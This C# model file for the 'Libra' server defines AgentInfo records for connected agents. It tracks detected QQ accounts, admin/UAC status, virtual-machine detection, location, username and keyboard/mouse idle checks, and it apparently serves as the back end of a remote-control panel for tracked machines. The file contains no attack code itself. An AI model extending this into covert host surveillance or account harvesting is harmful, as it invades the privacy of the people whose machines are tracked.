using Libra.Agent.Models.Module;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.Json.Serialization.Metadata;

namespace Libra.Server.Models
{
    #region 主实体：AgentInfo
    public class Runtimes
    {
        public static DateTime StartTime = DateTime.Now;
    }
    public class AgentInfo
    {
        /// <summary>
        /// Agent唯一标识 (UUID v4)
        /// </summary>
        [JsonPropertyName("agentId")]
        public Guid AgentId { get; set; }

        /// <summary>
        /// 内网连接信息
        /// </summary>
        [JsonPropertyName("network")]
        public NetworkEndpoint Network { get; set; } = new();

        /// <summary>
        /// 地理位置信息
        /// </summary>
        [JsonPropertyName("location")]
        public string Location { get; set; } = "";

        /// <summary>
        /// Agent程序文件名
        /// </summary>
        [JsonPropertyName("processName")]
        public string ProcessName { get; set; }

        /// <summary>
        /// 进程权限信息
        /// </summary>
        [JsonPropertyName("privilege")]
        public PrivilegeInfo Privilege { get; set; } = new();

        /// <summary>
        /// 检测到的QQ号列表
        /// </summary>
        [JsonPropertyName("qqAccounts")]
        public List<string> QQAccounts { get; set; } = new();

        /// <summary>
        /// 操作系统版本字符串
        /// 示例: "Windows 11 Pro 24H2"
        /// </summary>
        [JsonPropertyName("osVersion")]
        public string OsVersion { get; set; }

        /// <summary>
        /// 系统开机时间 (UTC+8)
        /// </summary>
        [JsonPropertyName("bootTime")]
        public DateTime? BootTime { get; set; }

        /// <summary>
        /// Agent进程启动时间 (UTC+8)
        /// </summary>
        [JsonPropertyName("startTime")]
        public DateTime? StartTime { get; set; } = Runtimes.StartTime;

        /// <summary>
        /// 上次用户活动时间 (UTC+8)
        /// 每30分钟检测鼠标/键盘位置变化，用于判断是否挂机
        /// </summary>
        [JsonPropertyName("lastActiveTime")]
        public DateTime? LastActiveTime { get; set; }

        /// <summary>
        /// 是否为挂机状态
        /// </summary>
        [JsonPropertyName("isIdle")]
        public bool IsIdle { get; set; }

        /// <summary>
        /// 硬件配置信息
        /// </summary>
        [JsonPropertyName("hardware")]
        public HardwareInfo Hardware { get; set; } = new();

        /// <summary>
        /// 扩展字段 (支持插件动态添加元数据)
        /// </summary>
        [JsonExtensionData]
        public Dictionary<string, object> Extensions { get; set; } = new();

        /// <summary>
        /// 最后心跳时间 (服务端维护)
        /// </summary>
        [JsonPropertyName("lastHeartbeat")]
        public DateTime? LastHeartbeat { get; set; }
    }

    #endregion

    #region 嵌套实体定义

    /// <summary>
    /// 网络端点信息
    /// </summary>
    public class NetworkEndpoint
    {
        [JsonPropertyName("ip")]
        public string Ip { get; set; }

        [JsonPropertyName("port")]
        public int Port { get; set; }

        [JsonPropertyName("mac")]
        public string MacAddress { get; set; }

        [JsonPropertyName("hostname")]
        public string Hostname { get; set; }

        [JsonPropertyName("username")]
        public string Username { get; set; }
    }

    /// <summary>
    /// 进程权限信息
    /// </summary>
    public class PrivilegeInfo
    {
        [JsonPropertyName("isAdmin")]
        public bool IsAdmin { get; set; }

        [JsonPropertyName("uacEnabled")]
        public bool? UacEnabled { get; set; }

        [JsonPropertyName("macStatus")]
        public string MandatoryAccessControl { get; set; }
    }

    /// <summary>
    /// 硬件配置信息
    /// </summary>
    public class HardwareInfo
    {
        [JsonPropertyName("cpu")]
        public CpuInfo Cpu { get; set; } = new();

        [JsonPropertyName("gpus")]
        public string[] Gpus { get; set; } = [];

        [JsonPropertyName("memory")]
        public float Memory { get; set; }

        [JsonPropertyName("disks")]
        public List<Disk> Disks { get; set; } = new();

        [JsonPropertyName("isVirtualMachine")]
        public bool IsVirtualMachine { get; set; }

        [JsonPropertyName("vmType")]
        public string VmType { get; set; }
    }

    /// <summary>
    /// CPU信息
    /// </summary>
    public class CpuInfo
    {
        [JsonPropertyName("name")]
        public string Name { get; set; }

        [JsonPropertyName("cores")]
        public int Cores { get; set; }

        [JsonPropertyName("logicalProcessors")]
        public int LogicalProcessors { get; set; }

        [JsonPropertyName("baseFrequencyMhz")]
        public double? BaseFrequencyMhz { get; set; }

        [JsonPropertyName("architecture")]
        public string Architecture { get; set; }
    }

    /// <summary>
    /// GPU信息
    /// </summary>
    public class GpuInfo
    {
        [JsonPropertyName("name")]
        public string Name { get; set; }

        [JsonPropertyName("vramMb")]
        public long? VramMb { get; set; }

        [JsonPropertyName("driverVersion")]
        public string DriverVersion { get; set; }

        [JsonPropertyName("isIntegrated")]
        public bool IsIntegrated { get; set; }
    }

    /// <summary>
    /// 磁盘类型枚举
    /// </summary>
    [JsonConverter(typeof(JsonStringEnumConverter))]
    public enum DiskType
    {
        Unknown,
        HDD,
        SSD,
        NVMe,
        Hybrid
    }

    #endregion

    #region 辅助扩展方法 (可选)

    /// <summary>
    /// AgentInfo 序列化/反序列化扩展
    /// </summary>
    public static class AgentInfoExtensions
    {
        private static readonly JsonSerializerOptions _defaultOptions = new()
        {
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
            PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
            WriteIndented = false, // 生产环境用false减少体积
            TypeInfoResolver = new DefaultJsonTypeInfoResolver()
        };

        /// <summary>
        /// 序列化为JSON字符串 (用于日志/调试)
        /// </summary>
        public static string ToJson(this AgentInfo agent, bool indent = false)
        {
            var options = indent
                ? new JsonSerializerOptions(_defaultOptions) { WriteIndented = true }
                : _defaultOptions;

            return JsonSerializer.Serialize(agent, options);
        }

        /// <summary>
        /// 从JSON字符串反序列化
        /// </summary>
        public static AgentInfo FromJson(string json)
        {
            return JsonSerializer.Deserialize<AgentInfo>(json, _defaultOptions);
        }

        /// <summary>
        /// 计算挂机状态
        /// </summary>
        public static bool CalculateIdleStatus(DateTime? lastActiveTime, int idleThresholdMinutes = 2)
        {
            if (lastActiveTime == null) return true;
            return DateTime.UtcNow - lastActiveTime.Value > TimeSpan.FromMinutes(idleThresholdMinutes);
        }

        /// <summary>
        /// 合并配置 (用于服务端下发配置更新)
        /// </summary>
        public static void MergeConfig(this AgentInfo target, AgentInfo source)
        {
            if (source == null) return;

            // 基本信息合并
            if (source.AgentId != default) target.AgentId = source.AgentId;
            if (!string.IsNullOrEmpty(source.ProcessName)) target.ProcessName = source.ProcessName;
            if (!string.IsNullOrEmpty(source.OsVersion)) target.OsVersion = source.OsVersion;

            // 时间字段合并
            if (source.BootTime.HasValue) target.BootTime = source.BootTime;
            if (source.StartTime.HasValue) target.StartTime = source.StartTime;
            if (source.LastActiveTime.HasValue) target.LastActiveTime = source.LastActiveTime;
            if (source.LastHeartbeat.HasValue) target.LastHeartbeat = source.LastHeartbeat;

            // 布尔字段合并
            target.IsIdle = source.IsIdle;

            // 嵌套对象合并
            if (source.Network != null) target.Network = source.Network;
            if (source.Location != null) target.Location = source.Location;
            if (source.Privilege != null) target.Privilege = source.Privilege;
            if (source.Hardware != null) target.Hardware = source.Hardware;

            // 列表字段合并
            if (source.QQAccounts != null && source.QQAccounts.Any())
            {
                target.QQAccounts ??= new List<string>();
                foreach (var account in source.QQAccounts)
                {
                    if (!target.QQAccounts.Contains(account))
                    {
                        target.QQAccounts.Add(account);
                    }
                }
            }

            // 扩展字段合并
            if (source.Extensions != null && source.Extensions.Any())
            {
                target.Extensions ??= new Dictionary<string, object>();
                foreach (var kvp in source.Extensions)
                {
                    target.Extensions[kvp.Key] = kvp.Value;
                }
            }
        }
    }

    #endregion
}